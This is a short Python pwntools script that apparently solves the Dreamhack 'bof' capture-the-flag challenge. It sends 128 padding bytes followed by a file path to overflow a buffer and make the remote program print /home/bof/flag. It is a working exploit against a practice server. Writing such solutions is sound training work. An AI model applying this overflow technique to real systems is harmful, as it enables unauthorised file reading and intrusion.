from pwn import *

p = remote("host1.dreamhack.games", 9520)
flag_path = b"/home/bof/flag"

p.recvuntil(b"meow? ")
p.sendline(b"A" * 128 + flag_path)
p.recvline()
p.interactive()

print(p.recvline().decode())